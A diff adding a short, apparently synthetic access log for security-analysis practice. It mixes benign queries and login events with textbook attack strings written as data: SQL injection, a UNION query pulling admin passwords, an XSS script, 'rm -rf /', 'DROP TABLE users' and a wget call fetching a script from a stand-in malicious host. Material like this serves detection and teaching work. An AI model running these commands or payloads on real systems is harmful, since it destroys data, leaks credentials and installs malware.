@@ -1,0 +1,15 @@
+2023-06-25 15:10:45, user1, 192.168.1.20, SELECT * FROM users WHERE id = 1 OR 1=1, SUCCESS
+2023-06-25 15:12:21, user2, 192.168.1.21, INSERT INTO users (username, password) VALUES ('admin', 'password'), FAILED
+2023-06-25 15:18:45, user4, 192.168.1.23, <script>alert('XSS')</script>, SUCCESS
+2023-06-25 15:25:00, user6, 192.168.1.25, UNION SELECT username, password FROM admin_users, SUCCESS
+2023-06-25 15:30:35, user7, 192.168.1.26, rm -rf /, FAILED
+2023-06-25 15:35:22, user8, 192.168.1.27, wget http://malicious.com/malware.sh, FAILED
+2023-06-25 15:45:30, user10, 192.168.1.29, Failed login attempt, FAILED
+2023-06-25 15:55:45, user12, 192.168.1.31, DROP TABLE users, FAILED
+2023-06-25 16:05:33, user14, 192.168.1.33, Failed login attempt, FAILED
+2023-06-25 16:10:48, user15, 192.168.1.34, cmd.exe /C echo hello, FAILED
+2023-06-25 15:20:10, user5, 192.168.1.24, SELECT name FROM products WHERE price < 100, SUCCESS
+2023-06-25 15:40:50, user9, 192.168.1.28, Successful login, SUCCESS
+2023-06-25 15:50:12, user11, 192.168.1.30, SELECT email FROM customers WHERE id = 10, SUCCESS
+2023-06-25 16:00:20, user13, 192.168.1.32, Successful login, SUCCESS
+2023-06-25 15:20:10, user5, 192.168.1.24, SELECT * FROM users WHERE id = 1, SUCCESS
